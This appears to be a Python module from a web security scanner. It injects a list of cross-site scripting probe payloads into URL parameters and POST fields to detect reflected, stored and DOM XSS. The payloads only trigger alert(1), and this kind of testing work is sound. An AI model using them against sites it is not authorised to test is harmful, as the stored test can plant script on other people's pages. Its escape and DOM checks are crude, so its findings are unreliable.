"""
modules/xss_detector.py - Cross-Site Scripting Detection and Exploitation
Reflected, Stored, DOM XSS
"""

import json
import logging
from typing import Dict, List, Any, Optional, Callable
from urllib.parse import urljoin, quote
import re

from core.http_engine import HTTPClient

logger = logging.getLogger("recon.xss")


class XSSDetector:
    """XSS detection - reflected, stored, DOM"""
    
    def __init__(self, output_dir: str, timeout: int = 30):
        self.output_dir = output_dir
        self.timeout = timeout
        self.http_client = HTTPClient(timeout=timeout)
        self.findings_file = f"{output_dir}/xss_findings.json"
    
    def detect(
        self,
        url: str,
        parameters: Optional[List[str]] = None,
        progress_cb: Optional[Callable[[str, str, str], None]] = None
    ) -> Dict[str, Any]:
        """Detect XSS vulnerabilities"""
        result = {
            'url': url,
            'tool': 'xss_detector',
            'type': 'xss_vulns',
            'reflected_xss': [],
            'stored_xss': [],
            'dom_xss': [],
            'payloads_tested': 0
        }
        
        if progress_cb:
            progress_cb('xss', 'xss_detector', 'Testing XSS...')
        
        logger.info(f"[XSS] Scanning {url}")
        
        if not parameters:
            parameters = self._extract_parameters(url)
        
        if not parameters:
            logger.info(f"[XSS] No parameters found")
            return result
        
        # Test reflected XSS
        for param in parameters:
            if progress_cb:
                progress_cb('xss', 'xss_detector', f'Testing {param}...')
            
            reflected = self._test_reflected(url, param)
            result['reflected_xss'].extend(reflected)
            result['payloads_tested'] += len(reflected)
            
            # Test stored XSS (via POST)
            stored = self._test_stored(url, param)
            result['stored_xss'].extend(stored)
        
        # Test DOM XSS
        dom = self._test_dom(url)
        result['dom_xss'].extend(dom)
        
        try:
            with open(self.findings_file, 'w') as f:
                json.dump(result, f, indent=2)
        except Exception as e:
            logger.error(f"[XSS] Error saving: {e}")
        
        if progress_cb:
            total = len(result['reflected_xss']) + len(result['stored_xss']) + len(result['dom_xss'])
            progress_cb('xss', 'xss_detector', f'Found {total} XSS vulns')
        
        return result
    
    def _test_reflected(self, url: str, param: str) -> List[Dict]:
        """Test for reflected XSS"""
        vulns = []
        
        # XSS payloads - simple to complex
        payloads = [
            # Basic script tag
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            
            # Event handlers
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '" onload="alert(1)',
            '\' onload=\'alert(1)',
            
            # Bypass quotes
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '"><img src=x onerror=alert(1)>',
            
            # DOM events
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            
            # HTML5
            '<video src=x onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<iframe src=x onerror=alert(1)>',
        ]
        
        for payload in payloads:
            try:
                test_url = self._inject_parameter(url, param, payload)
                resp = self.http_client.get(test_url, timeout=self.timeout)
                
                # Check if payload in response unescaped
                if self._is_payload_unescaped(payload, resp.text):
                    vulns.append({
                        'parameter': param,
                        'type': 'reflected',
                        'payload': payload,
                        'confidence': 'high'
                    })
                    logger.info(f"[XSS] REFLECTED FOUND on {param}")
                    break
            
            except Exception as e:
                logger.debug(f"[XSS] Test failed: {e}")
        
        return vulns
    
    def _test_stored(self, url: str, param: str) -> List[Dict]:
        """Test for stored XSS"""
        vulns = []
        
        # Try POST with XSS payload
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
        ]
        
        for payload in payloads:
            try:
                data = {param: payload}
                resp = self.http_client.post(url, data=data, timeout=self.timeout)
                
                # If successful, verify persistence
                verify = self.http_client.get(url, timeout=self.timeout)
                if self._is_payload_unescaped(payload, verify.text):
                    vulns.append({
                        'parameter': param,
                        'type': 'stored',
                        'payload': payload,
                        'confidence': 'high'
                    })
                    logger.info(f"[XSS] STORED FOUND on {param}")
                    break
            
            except Exception as e:
                logger.debug(f"[XSS] Stored test failed: {e}")
        
        return vulns
    
    def _test_dom(self, url: str) -> List[Dict]:
        """Test for DOM-based XSS"""
        vulns = []
        
        try:
            # Try URL fragment
            test_url = f"{url}#<img src=x onerror=alert(1)>"
            resp = self.http_client.get(test_url, timeout=self.timeout)
            
            # Check for DOM manipulation
            if 'eval(' in resp.text or 'innerHTML' in resp.text or 'document.write' in resp.text:
                vulns.append({
                    'type': 'dom',
                    'indicator': 'DOM manipulation found',
                    'confidence': 'medium'
                })
                logger.info(f"[XSS] DOM XSS potential found")
        
        except Exception as e:
            logger.debug(f"[XSS] DOM test failed: {e}")
        
        return vulns
    
    def _is_payload_unescaped(self, payload: str, response: str) -> bool:
        """Check if payload appears unescaped in response"""
        # Check for various escape patterns
        escape_patterns = [
            'lt;',  # &lt;
            'amp;',  # &amp;
            'quot;',  # &quot;
            '&#',  # HTML entity
        ]
        
        # If payload is unescaped, it will appear as-is
        if payload in response:
            # But check it's not escaped
            for pattern in escape_patterns:
                escaped = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace('&', '&amp;')
                if escaped in response:
                    return False  # It's escaped
            
            return True  # Unescaped
        
        return False
    
    def _extract_parameters(self, url: str) -> List[str]:
        """Extract parameters from URL"""
        params = []
        if '?' not in url:
            return params
        
        query_string = url.split('?', 1)[1]
        for pair in query_string.split('&'):
            if '=' in pair:
                param, _ = pair.split('=', 1)
                params.append(param)
        
        return params
    
    def _inject_parameter(self, url: str, param: str, payload: str) -> str:
        """Inject payload into parameter"""
        if '?' not in url:
            return url + f"?{param}={quote(payload)}"
        
        if param in url:
            import re
            pattern = rf"{param}=[^&]*"
            return re.sub(pattern, f"{param}={quote(payload)}", url)
        else:
            return url + f"&{param}={quote(payload)}"
